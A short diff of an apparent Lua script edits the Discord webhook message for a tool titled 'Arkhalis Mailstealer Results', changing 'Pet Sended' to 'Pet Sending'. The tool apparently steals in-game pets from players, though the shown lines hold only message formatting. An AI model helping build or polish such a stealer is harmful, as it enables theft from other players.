@@ -9,7 +9,7 @@ local msg = {
 	["embeds"]= {
 	  {
 		["title"]= "`Arkhalis Mailstealer Results`",
-		["description"]= "**Pet Sended (′ꈍωꈍ‵)**",
+		["description"]= "**Pet Sending (′ꈍωꈍ‵)**",
 		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
